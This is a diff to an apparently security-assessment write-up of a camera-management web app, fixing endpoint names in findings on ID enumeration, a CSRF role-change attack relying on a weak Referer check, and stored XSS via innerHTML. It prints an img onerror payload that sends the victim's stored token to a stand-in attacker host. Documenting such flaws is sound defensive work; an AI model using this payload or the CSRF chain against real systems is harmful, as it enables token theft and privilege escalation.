@@ -53,7 +53,7 @@ findings:
 - The frontend (_admin_access.js_) uses this endpoint to validate the user's role. However, **the endpoint does not verify whether the requester has permission** to access the requested user's data. The frontend assumes that if this function returns a role of _"admin"_, it can then request the administration panel via POST to _/admin_, which will allow access to administrator functionalities. The issue arises because the frontend code reveals an internal server route, _/api/v2/userinfo_, which suggests the possibility of accessing a previous version that does not validate the requesting user.
 - An attacker can **enumerate IDs** and obtain a map of users, their roles, and installed cameras, facilitating privilege escalation attacks, internal phishing, or resource mapping.
 
-Any user can access /admin panel in order to validate its role. If the user is not an admin account, the panel will refuse the access attempt. Pressing "Validate Access" button will call for /admin/v2/userinfo in order to get user's information to check this. This endpoint is secured up so an user cannot use it to get other users information.
+Any user can access /admin panel in order to validate its role. If the user is not an admin account, the panel will refuse the access attempt. Pressing "Validate Access" button will call for /api/v2/userinfo in order to get user's information to check this. This endpoint is secured up so an user cannot use it to get other users information.
 
 ![[api1-restricted-access.png]]
 
@@ -458,7 +458,7 @@ The voucher is created using several data fields, including the ID of the user w
 
 ## Change administrator password
 
-The */profile* endpoint displays a function for changing the password. If we analyze the JavaScript code, we can see that the request is made to the */profile-change_password* endpoint. By analyzing a password change request, we can see how it is processed by the server.
+The */profile* endpoint displays a function for changing the password. If we analyze the JavaScript code, we can see that the request is made to the */profile/change_password* endpoint. By analyzing a password change request, we can see how it is processed by the server.
 
 ![[api7_change_password.png]]
 Knowing how this request is processed, we can try to trick the server into processing a request. 
@@ -474,16 +474,16 @@ Description of the vulnerability
 The form found in the `admin.html` template can be exploited by SSRF attacks if the admin user visits a malicious page because it does not include any CSRF token or additional validation.
 
 ```html
-<form method="POST" action="/admin/assign-role">
+<form method="POST" action="/admin/roles">
     <!-- ... -->
 </form>
 ```
 
-The endpoint `/admin/assign-role` accepts any POST request if the user has a valid session. An attacker can create a malicious page with a hidden form that sends a POST request to `/admin/assign-role`, and if the administrator is authenticated and visits this page, the browser will automatically send the session cookies, the backend will receive the request, and since it does not validate the origin or have a CSRF token, it processes the role change as if it were a legitimate action by the admin.
+The endpoint `/admin/roles` accepts any POST request if the user has a valid session. An attacker can create a malicious page with a hidden form that sends a POST request to `/admin/roles`, and if the administrator is authenticated and visits this page, the browser will automatically send the session cookies, the backend will receive the request, and since it enforces only a weak `Referer` substring check (it just looks for `/admin` anywhere in the header) with no CSRF token, a POST from an attacker page whose own URL path contains `/admin` is processed as a legitimate role change by the admin.
 
 The attacker can take advantage of the `/support` endpoint that links to a resource that allows them to contact the administrator. This endpoint is used for new users to request access to the cameras from the administrator, granting them the role of `viewer`.
 
-In the request submission form that the system administrator will subsequently see, files such as images can be included to report errors and questions. These images can be attack vectors where the attacker includes HTML code that sends POST requests to the `/admin/assign-role` endpoint.
+In the request submission form that the system administrator will subsequently see, files such as images can be included to report errors and questions. These images can be attack vectors where the attacker includes HTML code that sends POST requests to the `/admin/roles` endpoint.
 
 
 # API8:2023 - Security Misconfiguration
@@ -559,16 +559,16 @@ ID           Response   Lines    Word       Chars       Payload
 
 The form found in the `admin.html` template can be exploited by CSRF attacks if the admin user visits a malicious page because it does not include any CSRF token or additional validation.
 ```html
-<form method="POST" action="/admin/assign-role">
+<form method="POST" action="/admin/roles">
     <!-- ... -->
 </form>
 ```
 
-The endpoint `/admin/assign-role` accepts any POST request if the user has a valid session. An attacker can create a malicious page with a hidden form that sends a POST request to `/admin/assign-role`, and if the administrator is authenticated and visits this page, the browser will automatically send the session cookies, the backend will receive the request, and since it does not validate the origin or have a CSRF token, it processes the role change as if it were a legitimate action by the admin.
+The endpoint `/admin/roles` accepts any POST request if the user has a valid session. An attacker can create a malicious page with a hidden form that sends a POST request to `/admin/roles`, and if the administrator is authenticated and visits this page, the browser will automatically send the session cookies, the backend will receive the request, and since it enforces only a weak `Referer` substring check (it just looks for `/admin` anywhere in the header) with no CSRF token, a POST from an attacker page whose own URL path contains `/admin` is processed as a legitimate role change by the admin.
 
 The attacker can take advantage of the `/support` endpoint that links to a resource that allows them to contact the administrator. This endpoint is used for new users to request access to the cameras from the administrator, granting them the role of `viewer`.
 
-In the request submission form that the system administrator will later see, files such as images can be included to report errors and questions. These images can be attack vectors where the attacker includes HTML code that sends POST requests to the `/admin/assign-role` endpoint.
+In the request submission form that the system administrator will later see, files such as images can be included to report errors and questions. These images can be attack vectors where the attacker includes HTML code that sends POST requests to the `/admin/roles` endpoint.
 
 ##  Attack Vector #2: Information Disclosure via System Logs
 
@@ -724,7 +724,7 @@ Because the opened message is injected with `innerHTML`, any markup in the body 
 Chained with the API10 sender spoofing, the attacker sends a message that appears to come from `admin` and carries an HTML payload. A `<script>` element inserted through `innerHTML` does not execute, so the working vector is an event handler or an inline form:
 
 ```html
-<img src=x onerror="fetch('https://attacker.tld/x?j='+localStorage.getItem('jwt'))">
+<img src=x onerror="fetch('https://attacker.tld/x?j='+localStorage.getItem('auth'))">
 ```
 
 When the victim opens the message the handler fires and exfiltrates the victim's JWT, which is also stored in plaintext by the mobile app (see [[Mobile/Vulnerabilities#M9: Insecure Data Storage|M9 - Insecure Data Storage]]). An inline fake login form is an equally effective phishing variant, reinforcing the spoofing scenario documented above.
